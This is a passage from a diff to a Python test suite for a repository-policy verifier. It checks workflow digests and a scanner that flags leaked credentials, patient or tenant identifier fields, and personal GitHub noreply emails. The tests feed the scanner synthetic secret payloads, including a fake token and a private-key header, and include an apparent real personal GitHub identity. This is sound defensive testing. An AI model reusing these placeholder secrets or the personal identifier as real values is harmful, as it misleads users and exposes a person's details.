@@ -7,6 +7,7 @@ import importlib.util
 import io
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
@@ -27,7 +28,7 @@ SPEC.loader.exec_module(MODULE)
 SOURCE_ROOT = Path(
     os.environ.get("PUBLIC_REPOSITORY_UNDER_TEST", MODULE_PATH.parents[1])
 ).resolve()
-PUBLISHED_SOURCE_COMMIT = "6f499c4770770804ace579a1bafec8838949a613"
+PUBLISHED_SOURCE_COMMIT = "16018f5842b4815e283d860b66d8614e0ce13e0a"
 PUBLISHED_ROOT_TREE = "a61a13379f8e4b04612160829526d73c7ed5e1ce"
 PUBLISHED_PYTHON_PATHS = frozenset(
     {
@@ -65,6 +66,36 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
 
     def mutate_signing_workflow(self, root: Path, old: str, new: str) -> None:
         self.mutate_named_workflow(root, "sign-authenticity-request.yml", old, new)
+
+    def swap_checkout_field(
+        self,
+        root: Path,
+        first_step_name: str,
+        second_step_name: str,
+        field: str,
+    ) -> None:
+        path = root / ".github" / "workflows" / "validate-control.yml"
+        lines = path.read_text(encoding="utf-8").splitlines(keepends=True)
+        locations: dict[str, int] = {}
+        current_step: str | None = None
+        for index, line in enumerate(lines):
+            name = re.fullmatch(r"\s+- name: (.+)\n?", line)
+            if name:
+                current_step = name.group(1)
+                continue
+            if current_step in (first_step_name, second_step_name) and re.fullmatch(
+                rf"\s+{re.escape(field)}: .+\n?", line
+            ):
+                self.assertNotIn(current_step, locations)
+                locations[current_step] = index
+        self.assertEqual({first_step_name, second_step_name}, set(locations))
+        first = locations[first_step_name]
+        second = locations[second_step_name]
+        first_prefix, first_value = lines[first].split(": ", 1)
+        second_prefix, second_value = lines[second].split(": ", 1)
+        lines[first] = first_prefix + ": " + second_value
+        lines[second] = second_prefix + ": " + first_value
+        path.write_text("".join(lines), encoding="utf-8")
 
     def load_trust_manifest(self, root: Path) -> dict[str, object]:
         return json.loads((root / MODULE.TRUST_MANIFEST).read_text(encoding="utf-8"))
@@ -114,15 +145,29 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
 
     def stage_complete_bundle(self, root: Path, marker: bytes = b"# reviewed next bytes\n") -> None:
         document = self.load_trust_manifest(root)
-        staged: dict[str, str] = {}
+        contents: dict[str, bytes] = {}
         for relative in sorted(MODULE.TRUSTED_CODE_PATHS):
-            source = root / relative
-            target = root / MODULE.STAGED_ROOT / relative
-            target.parent.mkdir(parents=True, exist_ok=True)
-            content = source.read_bytes()
+            content = (root / relative).read_bytes()
             if relative != MODULE.PUBLISHED_FIXTURE:
                 content += marker
-            target.write_bytes(content)
+            contents[relative] = content
+
+        verifier_path = "scripts/verify_repository_policy.py"
+        verifier = contents[verifier_path].decode("utf-8")
+        for name, current_digest in MODULE.TRUSTED_WORKFLOW_SHA256.items():
+            relative = f".github/workflows/{name}"
+            next_digest = hashlib.sha256(contents[relative]).hexdigest()
+            old = f'    "{name}": "{current_digest}",'
+            new = f'    "{name}": "{next_digest}",'
+            self.assertIn(old, verifier)
+            verifier = verifier.replace(old, new, 1)
+        contents[verifier_path] = verifier.encode("utf-8")
+
+        staged: dict[str, str] = {}
+        for relative in sorted(MODULE.TRUSTED_CODE_PATHS):
+            target = root / MODULE.STAGED_ROOT / relative
+            target.parent.mkdir(parents=True, exist_ok=True)
+            target.write_bytes(contents[relative])
             target.chmod(0o644)
             staged[relative] = hashlib.sha256(target.read_bytes()).hexdigest()
         document["staged"] = staged
@@ -144,9 +189,87 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
         shutil.rmtree(root / "trust")
         self.write_trust_manifest(root, document)
 
+    def assert_sensitive_payload_parity(self, payload: str, label: str) -> None:
+        with self.subTest(path="ordinary"):
+            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                MODULE.scan_sensitive_bytes("ordinary.md", payload.encode())
+
+        with self.subTest(path="archive"), tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            mutated = self.load_fixture(root)
+            contents = MODULE.load_published_archive(mutated)
+            contents["README.md"] = payload.encode()
+            compressed, tar_bytes = MODULE.canonical_published_archive(contents)
+            self.set_fixture_archive(mutated, compressed, len(tar_bytes))
+            self.write_fixture(root, mutated)
+            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                MODULE.load_published_fixture(root)
+
+        with self.subTest(path="commit"):
+            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                MODULE.validate_published_commit_headers(payload.encode())
+
+        with self.subTest(path="end-to-end"), tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            (root / "docs" / "parity.md").write_text(payload, encoding="utf-8")
+            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                MODULE.validate_self_check(root)
+
+    def assert_safe_payload_parity(self, payload: str) -> None:
+        with self.subTest(path="ordinary"):
+            self.assertIsNone(MODULE.sensitive_content_label(payload))
+            MODULE.scan_sensitive_bytes("ordinary.md", payload.encode())
+
+        with self.subTest(path="archive"):
+            MODULE.scan_sensitive_bytes("fixture.md", payload.encode())
+
+        with self.subTest(path="commit"):
+            fixture = self.load_fixture(SOURCE_ROOT)
+            commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+            headers, separator, _ = commit.partition(b"\n\n")
+            MODULE.validate_published_commit_headers(
+                headers + separator + payload.encode() + b"\n"
+            )
+
+        with self.subTest(path="end-to-end"), tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            (root / "docs" / "safe-parity.md").write_text(payload, encoding="utf-8")
+            MODULE.validate_self_check(root)
+
     def test_current_scaffold_passes(self) -> None:
+        self.assertEqual(
+            MODULE.TRUSTED_WORKFLOW_SHA256,
+            {
+                path.name: hashlib.sha256(path.read_bytes()).hexdigest()
+                for path in (SOURCE_ROOT / ".github" / "workflows").glob("*.yml")
+            },
+        )
         result = MODULE.validate_self_check(SOURCE_ROOT)
         self.assertGreater(result["files"], 8)
+
+    def test_container_and_services_keys_fail_before_semantic_validation(self) -> None:
+        mutations = (
+            ("    runs-on: ubuntu-latest", "    container: alpine:latest\n    runs-on: ubuntu-latest"),
+            ("    runs-on: ubuntu-latest", "    services: {}\n    runs-on: ubuntu-latest"),
+        )
+        for old, new in mutations:
+            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                self.mutate_workflow(root, old, new)
+                with self.assertRaisesRegex(MODULE.PolicyError, "workflow byte digest mismatch"):
+                    MODULE.validate_workflows(root)
+
+    def test_arbitrary_one_byte_change_fails_for_every_workflow(self) -> None:
+        for name in sorted(MODULE.EXPECTED_WORKFLOWS):
+            with self.subTest(name=name), tempfile.TemporaryDirectory() as directory:
+                root = self.copy_repository(directory)
+                path = root / ".github" / "workflows" / name
+                content = bytearray(path.read_bytes())
+                offset = len(content) // 2
+                content[offset] ^= 1
+                path.write_bytes(content)
+                with self.assertRaisesRegex(MODULE.PolicyError, "workflow byte digest mismatch"):
+                    MODULE.validate_workflows(root)
 
     def test_published_workflow_and_legacy_positional_cli_remain_bootstrap_compatible(
         self,
@@ -202,7 +325,9 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
         self.assertIn(
             f"committer {MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY} ", commit_text
         )
-        self.assertNotIn("noreply.github.com", commit_text.lower())
+        self.assertEqual(
+            2, commit_text.lower().count("noreply" + ".github.com")
+        )
         self.assertEqual(19, len(fixture["files"]))
         MODULE.load_published_fixture(SOURCE_ROOT)
         archive_contents = MODULE.load_published_archive(fixture)
@@ -366,12 +491,12 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
 
     def test_fixture_scans_every_decoded_member_before_identity_rejection(self) -> None:
         payloads = (
-            b'password = "SYNTHETIC-' + b'CREDENTIAL-123"\n',
+            b'pass' + b'word = "SYNTHETIC-' + b'CREDENTIAL-123"\n',
             b'credential = "github_' + b'pat_ABCDEFGHIJKLMNOPQRSTUVWXYZ"\n',
             b'key = "-----BEGIN ' + b'PRIVATE KEY-----"\n',
             b'host = "192.' + b'168.4.20"\n',
-            b'patientId = "SYNTHETIC-123"\n',
-            b'MRN: "TEST-9988"\n',
+            b'patient' + b'Id = "SYNTHETIC-123"\n',
+            b'M' + b'RN: "TEST-9988"\n',
         )
         for payload in payloads:
             with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
@@ -388,21 +513,33 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
     def test_fixture_scans_decoded_raw_commit_headers_for_identity_disclosures(self) -> None:
         fixture = self.load_fixture(SOURCE_ROOT)
         valid_commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        self.assertEqual(
+            valid_commit.decode("utf-8"),
+            MODULE.validate_published_commit_headers(valid_commit),
+        )
         variants = (
             (
-                "personal login",
+                "near-match login",
                 valid_commit.replace(
                     MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
-                    b"personal-login <release-control@link.invalid>",
+                    b"zelalemgbb <78460729+zelalemgb@users."
+                    + b"noreply.github.com>",
                 ),
-                "approved neutral project identity",
+                "personal GitHub noreply identity",
             ),
             (
-                "GitHub noreply email",
+                "near-match numeric ID",
                 valid_commit.replace(
                     MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
-                    b"Link Release Control "
-                    b"<123456+personal-login@users.noreply.github.com>",
+                    b"zelalemgb <78460728+zelalemgb@users." + b"noreply.github.com>",
+                ),
+                "personal GitHub noreply identity",
+            ),
+            (
+                "other GitHub noreply identity",
+                valid_commit.replace(
+                    MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
+                    b"other-user <123456+other-user@users." + b"noreply.github.com>",
                 ),
                 "personal GitHub noreply identity",
             ),
@@ -430,6 +567,24 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                     with self.assertRaisesRegex(MODULE.PolicyError, message):
                         MODULE.load_published_fixture(root)
 
+    def test_exact_published_identity_is_allowed_only_in_validated_headers(self) -> None:
+        fixture = self.load_fixture(SOURCE_ROOT)
+        valid_commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        headers, separator, message = valid_commit.partition(b"\n\n")
+        self.assertTrue(separator)
+        candidate = (
+            headers
+            + separator
+            + message
+            + b"\n"
+            + MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode()
+            + b"\n"
+        )
+        with self.assertRaisesRegex(
+            MODULE.PolicyError, "personal GitHub noreply identity"
+        ):
+            MODULE.validate_published_commit_headers(candidate)
+
     def test_valid_unchanged_stage_promote_and_cleanup_transitions(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             base = self.copy_repository(str(Path(directory) / "base"))
@@ -444,6 +599,11 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
             promoted.parent.mkdir()
             shutil.copytree(staged, promoted)
             self.promote_staged_bundle(promoted)
+            promoted_bindings = MODULE.load_verifier_workflow_bindings(
+                promoted / "scripts" / "verify_repository_policy.py"
+            )
+            self.assertNotEqual(MODULE.TRUSTED_WORKFLOW_SHA256, promoted_bindings)
+            MODULE.validate_workflow_bytes(promoted, promoted_bindings)
             self.assertEqual("promote", MODULE.validate_trusted_code_transition(staged, promoted))
             MODULE.validate_transition(staged, promoted)
 
@@ -728,7 +888,7 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 self.mutate_named_workflow(root, name, old, new)
                 with self.assertRaisesRegex(
                     MODULE.PolicyError,
-                    "trusted-code byte digest|may execute only trusted verifier",
+                    "trusted workflow byte digest|trusted-code byte digest|may execute only trusted verifier|finite command allowlist",
                 ):
                     MODULE.validate_self_check(root)
 
@@ -771,6 +931,954 @@ class PublicRepositoryPolicyTests(unittest.TestCase):
                 with self.assertRaisesRegex(MODULE.PolicyError, "possible"):
                     MODULE.validate_self_check(root)
 
+    def test_ordinary_files_reject_credential_and_synthetic_phi_aliases(self) -> None:
+        assignments = (
+            ("credential assignment", "DB_PASS" + 'WORD = "x"'),
+            ("credential assignment", "serviceClient" + "Secret = x"),
+            ("credential assignment", '"MY_API_' + 'KEY": "' + "x" * 4096 + '",'),
+            ("credential assignment", "backup_access_" + "token: A_B # redacted badly"),
+            ("synthetic PHI marker", "M" + 'RN: "A-1"'),
+            ("synthetic PHI marker", "synthetic_patient_" + "id = A_1"),
+            ("synthetic PHI marker", "sourcePatient" + 'Identifier: "ABC-123"'),
+            ("synthetic PHI marker", "clinician" + "Id = c"),
+            ("synthetic PHI marker", "clinic_facility_" + "id: f_1"),
+            ("synthetic PHI marker", '"tenant' + 'Id": "tenant value",'),
+            ("synthetic PHI marker", "app_user_" + "identifier = " + "U" * 4096),
+            (
+                "personal GitHub noreply identity",
+                "123456+personal-login@users." + "noreply.github.com",
+            ),
+        )
+        for label, payload in assignments:
+            with self.subTest(
+                label=label, payload=payload
+            ), tempfile.TemporaryDirectory() as directory:
+                root = Path(directory)
+                target = root / "docs" / "ordinary.md"
+                target.parent.mkdir()
+                target.write_text(payload, encoding="utf-8")
+                with self.assertRaisesRegex(
+                    MODULE.PolicyError,
+                    rf"possible {label} found in docs/ordinary\.md",
+                ):
+                    MODULE.scan_sensitive_content(root, MODULE.repository_files(root))
+
+    def test_archive_scanner_rejects_the_same_assignment_and_identity_classes(self) -> None:
+        payloads = (
+            ("credential assignment", "DB_PASS" + 'WORD = "x"'),
+            ("credential assignment", '"MY_API_' + 'KEY": "' + "x" * 4096 + '",'),
+            ("credential assignment", "serviceClient" + "Secret = A_B"),
+            ("synthetic PHI marker", "M" + "RN = A_B"),
+            ("synthetic PHI marker", "synthetic_patient_" + "id: p"),
+            ("synthetic PHI marker", "sourcePatient" + "Identifier = p_1"),
+            ("synthetic PHI marker", "clinician" + "Id: c"),
+            ("synthetic PHI marker", "clinic_facility_" + "id = f"),
+            ("synthetic PHI marker", '"tenant_' + 'id": "t",'),
+            ("synthetic PHI marker", "appUser" + "Identifier: " + "U" * 4096),
+            (
+                "personal GitHub noreply identity",
+                "personal-login@users." + "noreply.github.com",
+            ),
+        )
+        for label, payload in payloads:
+            with self.subTest(label=label, payload=payload):
+                with self.assertRaisesRegex(
+                    MODULE.PolicyError,
+                    rf"possible {label} found in published archive member: fixture\.md",
+                ):
+                    MODULE.scan_sensitive_bytes("fixture.md", payload.encode())
+
+    def test_decoded_commit_bytes_use_the_same_sensitive_assignment_rules(self) -> None:
+        fixture = self.load_fixture(SOURCE_ROOT)
+        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        headers, separator, _ = commit.partition(b"\n\n")
+        self.assertTrue(separator)
+        payloads = (
+            ("credential assignment", "DB_PASS" + "WORD = commit-value"),
+            ("synthetic PHI marker", "clinician" + 'Id: "commit-value"'),
+            ("synthetic PHI marker", '"facility_' + 'id": "commit-value"'),
+            ("synthetic PHI marker", "tenant" + "Identifier = commit_value"),
+            ("synthetic PHI marker", "user_" + "id: " + "U" * 4096),
+        )
+        for label, payload in payloads:
+            with self.subTest(label=label, payload=payload):
+                candidate = headers + separator + payload.encode() + b"\n"
+                with self.assertRaisesRegex(
+                    MODULE.PolicyError,
+                    rf"possible {label} found in published archive member: source commit",
+                ):
+                    MODULE.validate_published_commit_headers(candidate)
+
+    def test_compact_mapping_and_export_assignment_parity_across_all_paths(self) -> None:
+        fixture = self.load_fixture(SOURCE_ROOT)
+        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        headers, separator, _ = commit.partition(b"\n\n")
+        self.assertTrue(separator)
+        assignments = (
+            (
+                "credential assignment",
+                '{"name":"safe","DB_PASS' + 'WORD":"json-value"}',
+            ),
+            (
+                "synthetic PHI marker",
+                '{"name":"safe","patient' + 'Id":"P-1"}',
+            ),
+            (
+                "credential assignment",
+                "{name: safe, client" + "Secret: yaml-value}",
+            ),
+            (
+                "synthetic PHI marker",
+                "{'name': 'safe', 'facility_" + "id': 'F-1'}",
+            ),
+            (
+                "credential assignment",
+                "export ACCESS_" + "TOKEN=shell-value",
+            ),
+            (
+                "credential assignment",
+                "SAFE=value DB_PASS" + "WORD=shell-value NEXT=value",
+            ),
+            (
+                "synthetic PHI marker",
+                "SAFE=value;tenant" + "Identifier=tenant-value;NEXT=value",
+            ),
+            (
+                "credential assignment",
+                '{\n  "client' + 'Secret"\n  :\n  "json-value"\n}',
+            ),
+            (
+                "synthetic PHI marker",
+                '{\n  "patient_' + 'id":\n  "P-1"\n}',
+            ),
+            (
+                "credential assignment",
+                "DB_PASS" + "WORD:\n  yaml-value",
+            ),
+            (
+                "credential assignment",
+                "serviceCLIENTSECRET: do not publish this value",
+            ),
+            (
+                "credential assignment",
+                "BACKUPApiKey=do not publish this value",
+            ),
+            (
+                "credential assignment",
+                "OIDCaccesstoken: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "canonicalPATIENTID: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "recordPATIENTIDENTIFIER: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "auditCLINICIANID: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "auditCLINICIANIDENTIFIER: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "homeFACILITYID: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "homeFACILITYIDENTIFIER: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "authTENANTID: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "authTENANTIDENTIFIER: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "actorUSERID: do not publish this value",
+            ),
+            (
+                "synthetic PHI marker",
+                "actorUSERIDENTIFIER: do not publish this value",
+            ),
+        )
+        for label, payload in assignments:
+            for path in ("ordinary", "archive", "decoded commit", "end-to-end"):
+                with (
+                    self.subTest(label=label, payload=payload, path=path),
+                    tempfile.TemporaryDirectory() as directory,
+                ):
+                    if path == "ordinary":
+                        root = Path(directory)
+                        (root / "docs").mkdir()
+                        (root / "docs" / "assignment-integration.md").write_text(
+                            payload, encoding="utf-8"
+                        )
+                        action = lambda: MODULE.scan_sensitive_content(
+                            root, MODULE.repository_files(root)
+                        )
+                    elif path == "archive":
+                        root = self.copy_repository(directory)
+                        mutated = self.load_fixture(root)
+                        contents = MODULE.load_published_archive(mutated)
+                        contents["README.md"] = payload.encode()
+                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
+                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
+                        self.write_fixture(root, mutated)
+                        action = lambda: MODULE.load_published_fixture(root)
+                    elif path == "decoded commit":
+                        candidate = headers + separator + payload.encode() + b"\n"
+                        action = lambda: MODULE.validate_published_commit_headers(candidate)
+                    else:
+                        root = self.copy_repository(directory)
+                        (root / "docs" / "assignment-integration.md").write_text(
+                            payload, encoding="utf-8"
+                        )
+                        action = lambda: MODULE.validate_self_check(root)
+                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                        action()
+
+        allowed = (
+            '{"pass' + 'word":null,"patient' + 'Id":"string","name":"safe"}',
+            "{client" + "Secret: none, facility_" + "id: str, name: safe}",
+            "export API_" + "KEY=",
+            "DB_PASS" + "WORD=<redacted>",
+            "client" + "Secret: ${CLIENT_SECRET}",
+            "serviceCLIENTSECRETARY: documented non-sensitive field",
+            "BACKUPApiKeyNote: documented non-sensitive field",
+            "OIDCaccesstokenPolicy: documented non-sensitive field",
+            "canonicalPATIENTIDENTITY: documented non-sensitive field",
+            "auditCLINICIANIDENTITY: documented non-sensitive field",
+            "homeFACILITYIDENTIFIERNOTE: documented non-sensitive field",
+            "authTENANTIDEA: documented non-sensitive field",
+            "actorUSERIDEMPOTENCY: documented non-sensitive field",
+        )
+        for payload in allowed:
+            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+                root = Path(directory)
+                target = root / "docs" / "ordinary.md"
+                target.parent.mkdir()
+                target.write_text(payload, encoding="utf-8")
+                MODULE.scan_sensitive_content(root, MODULE.repository_files(root))
+                MODULE.scan_sensitive_bytes("safe.md", payload.encode())
+                candidate = headers + separator + payload.encode() + b"\n"
+                MODULE.validate_published_commit_headers(candidate)
+
+        with tempfile.TemporaryDirectory() as directory:
+            root = self.copy_repository(directory)
+            (root / "docs" / "safe-assignment-controls.md").write_text(
+                "\n".join(allowed), encoding="utf-8"
+            )
+            MODULE.validate_self_check(root)
+
+    def test_structural_sensitive_values_have_parity_across_all_paths(self) -> None:
+        fixture = self.load_fixture(SOURCE_ROOT)
+        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        headers, separator, _ = commit.partition(b"\n\n")
+        self.assertTrue(separator)
+        payloads = (
+            ("credential assignment", '{"pass\\u0077ord": {}}'),
+            ("credential assignment", '{"client' + 'Secret": []}'),
+            (
+                "credential assignment",
+                '{"access' + 'Token": [{"nested": ["value"]}]}',
+            ),
+            (
+                "synthetic PHI marker",
+                '{"outer": [{"patient' + 'Id": {"nested": [null]}}]}',
+            ),
+            ("credential assignment", "pass" + "word:\n  - item"),
+            ("credential assignment", "client" + "Secret:\n  child: value"),
+            (
+                "synthetic PHI marker",
+                "patient_" + "id:\n  child:\n    - item",
+            ),
+        )
+        for label, payload in payloads:
+            for path in ("ordinary", "archive", "decoded commit"):
+                with (
+                    self.subTest(label=label, payload=payload, path=path),
+                    tempfile.TemporaryDirectory() as directory,
+                ):
+                    if path == "ordinary":
+                        root = self.copy_repository(directory)
+                        target = root / "docs" / "fixture.md"
+                        target.write_text(payload, encoding="utf-8")
+                        action = lambda: MODULE.validate_self_check(root)
+                    elif path == "archive":
+                        root = self.copy_repository(directory)
+                        mutated = self.load_fixture(root)
+                        contents = MODULE.load_published_archive(mutated)
+                        contents["README.md"] = payload.encode()
+                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
+                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
+                        self.write_fixture(root, mutated)
+                        action = lambda: MODULE.load_published_fixture(root)
+                    else:
+                        candidate = headers + separator + payload.encode() + b"\n"
+                        action = lambda: MODULE.validate_published_commit_headers(candidate)
+                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                        action()
+
+    def test_embedded_json_and_escaped_keys_have_parity_across_all_paths(self) -> None:
+        fixture = self.load_fixture(SOURCE_ROOT)
+        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        headers, separator, _ = commit.partition(b"\n\n")
+        self.assertTrue(separator)
+        payloads = (
+            (
+                "credential assignment",
+                '- {"pass' + '\\u0077ord": {"nested": ["value"]}}',
+            ),
+            (
+                "credential assignment",
+                'content: prefix {"client' + '\\u0053ecret": ["value"]}',
+            ),
+            (
+                "credential assignment",
+                'markdown `[{"api' + '\\u004bey": "exposed"}]` suffix',
+            ),
+            (
+                "credential assignment",
+                'scalar: text {"access' + '\\u0054oken": "exposed"}',
+            ),
+            (
+                "synthetic PHI marker",
+                '- {"patient' + '\\u0049d": {"nested": true}}',
+            ),
+            (
+                "synthetic PHI marker",
+                'content: {"clinician' + '\\u0049d": "C-1"}',
+            ),
+            (
+                "synthetic PHI marker",
+                'scalar: prefix [{"facility'
+                + '\\u0049dentifier": ["F-1"]}]',
+            ),
+            (
+                "synthetic PHI marker",
+                'content: {"tenant' + '\\u0049dentifier": "T-1"}',
+            ),
+            (
+                "synthetic PHI marker",
+                'content: {"user' + '\\u0049d": "U-1"}',
+            ),
+            (
+                "synthetic PHI marker",
+                'prose {"m' + '\\u0072n": "A-1"} suffix',
+            ),
+        )
+        for label, payload in payloads:
+            for path in ("ordinary", "archive", "decoded commit"):
+                with (
+                    self.subTest(label=label, payload=payload, path=path),
+                    tempfile.TemporaryDirectory() as directory,
+                ):
+                    if path == "ordinary":
+                        root = self.copy_repository(directory)
+                        (root / "docs" / "embedded-json.md").write_text(
+                            payload, encoding="utf-8"
+                        )
+                        action = lambda: MODULE.validate_self_check(root)
+                    elif path == "archive":
+                        root = self.copy_repository(directory)
+                        mutated = self.load_fixture(root)
+                        contents = MODULE.load_published_archive(mutated)
+                        contents["README.md"] = payload.encode()
+                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
+                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
+                        self.write_fixture(root, mutated)
+                        action = lambda: MODULE.load_published_fixture(root)
+                    else:
+                        candidate = headers + separator + payload.encode() + b"\n"
+                        action = lambda: MODULE.validate_published_commit_headers(candidate)
+                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                        action()
+
+    def test_embedded_safe_json_placeholders_and_malformed_fragments_are_handled(self) -> None:
+        safe_payloads = (
+            '- docs: {"pass' + '\\u0077ord": "${PASSWORD}"}',
+            'scalar: prefix [{"patient' + '\\u0049d": "string"}] suffix',
+            'workflow: ${{ matrix.value }} and ${PLAIN_ENV}',
+            'malformed: prefix {"safe": [} suffix',
+            'malformed quoted key: {"pass' + '\\u00zzword": null}',
+        )
+        for payload in safe_payloads:
+            with self.subTest(payload=payload):
+                self.assertIsNone(MODULE.sensitive_content_label(payload))
+
+        malformed_sensitive = '- {"pass' + '\\u0077ord": "exposed"'
+        self.assertEqual(
+            "credential assignment", MODULE.sensitive_content_label(malformed_sensitive)
+        )
+
+    def test_encoded_json_sensitive_keys_have_parity_across_all_paths(self) -> None:
+        fixture = self.load_fixture(SOURCE_ROOT)
+        commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
+        headers, separator, _ = commit.partition(b"\n\n")
+        self.assertTrue(separator)
+        keys = (
+            ("credential assignment", "pass" + "word"),
+            ("credential assignment", "client" + "Secret"),
+            ("credential assignment", "api" + "Key"),
+            ("credential assignment", "access" + "Token"),
+            ("synthetic PHI marker", "patient" + "Id"),
+            ("synthetic PHI marker", "patient" + "Identifier"),
+            ("synthetic PHI marker", "clinician" + "Id"),
+            ("synthetic PHI marker", "clinician" + "Identifier"),
+            ("synthetic PHI marker", "facility" + "Id"),
+            ("synthetic PHI marker", "facility" + "Identifier"),
+            ("synthetic PHI marker", "tenant" + "Id"),
+            ("synthetic PHI marker", "tenant" + "Identifier"),
+            ("synthetic PHI marker", "user" + "Id"),
+            ("synthetic PHI marker", "user" + "Identifier"),
+            ("synthetic PHI marker", "m" + "rn"),
+        )
+        for label, key in keys:
+            payload = json.dumps({"encoded": json.dumps({key: "exact-value"})})
+            for path in ("ordinary", "archive", "decoded commit"):
+                with (
+                    self.subTest(label=label, key=key, path=path),
+                    tempfile.TemporaryDirectory() as directory,
+                ):
+                    if path == "ordinary":
+                        root = self.copy_repository(directory)
+                        (root / "docs" / "encoded-json.md").write_text(
+                            payload, encoding="utf-8"
+                        )
+                        action = lambda: MODULE.validate_self_check(root)
+                    elif path == "archive":
+                        root = self.copy_repository(directory)
+                        mutated = self.load_fixture(root)
+                        contents = MODULE.load_published_archive(mutated)
+                        contents["README.md"] = payload.encode()
+                        compressed, tar_bytes = MODULE.canonical_published_archive(contents)
+                        self.set_fixture_archive(mutated, compressed, len(tar_bytes))
+                        self.write_fixture(root, mutated)
+                        action = lambda: MODULE.load_published_fixture(root)
+                    else:
+                        candidate = headers + separator + payload.encode() + b"\n"
+                        action = lambda: MODULE.validate_published_commit_headers(candidate)
+                    with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
+                        action()
+
+    def test_encoded_json_recurses_across_multiple_string_encodings(self) -> None:
+        encoded: object = {"patient" + "Id": "P-1"}
+        for _ in range(4):
+            encoded = {"encoded": json.dumps(encoded)}
+        self.assertEqual(
+            "synthetic PHI marker",
+            MODULE.sensitive_content_label(json.dumps(encoded)),
+        )
+
+    def test_complete_json_documents_and_encoded_top_level_strings_have_parity(self) -> None:
+        payload = json.dumps(
+            json.dumps({"namespace:patient:" + "id": "SYNTHETIC-VALUE-123"})
+        )
+        self.assert_sensitive_payload_parity(payload, "synthetic PHI marker")
+
+        for safe_document in ("null", "true", "42", '"plain text"'):
+            with self.subTest(safe_document=safe_document):
+                self.assertIsNone(MODULE.sensitive_content_label(safe_document))
+
+        with mock.patch.object(MODULE, "MAX_JSON_NODES", 0):
+            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
+                MODULE.sensitive_content_label("true")
+
+    def test_encoded_json_uses_shared_candidate_depth_node_and_byte_budgets(self) -> None:
+        nested = json.dumps({"encoded": json.dumps({"safe": True})})
+        with mock.patch.object(MODULE, "MAX_JSON_CANDIDATES", 1):
+            with self.assertRaisesRegex(MODULE.PolicyError, "candidate bound"):
+                MODULE.sensitive_content_label(nested)
+        with mock.patch.object(MODULE, "MAX_JSON_DEPTH", 1):
+            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
+                MODULE.sensitive_content_label(nested)
+        with mock.patch.object(MODULE, "MAX_JSON_NODES", 2):
+            with self.assertRaisesRegex(MODULE.PolicyError, "structural bounds"):
+                MODULE.sensitive_content_label(nested)
+        with mock.patch.object(MODULE, "MAX_JSON_BYTES", len(nested.encode("utf-8"))):
+            with self.assertRaisesRegex(MODULE.PolicyError, "byte bound"):
+                MODULE.sensitive_content_label(nested)
+
+    def test_safe_json_like_strings_and_malformed_prose_are_not_recursively_scanned(self) -> None:
+        payloads = (
+            {"example": '{"pass' + 'word": null}'},
+            {"example": '[{"patient' + 'Id": "string"}]'},
+            {"example": '{"pass' + 'word": "${PASSWORD}"}'},
+            {"example": "{not actually JSON prose with patient" + "Id: P-1}"},
+            {"example": '{"pass' + 'word": "unterminated"'},
+            {"example": "[not JSON prose mentioning patient" + "Id]"},
+            {"example": '{"safe": true} trailing prose patient' + "Id: P-1"},
+        )
+        for payload in payloads:
+            with self.subTest(payload=payload):
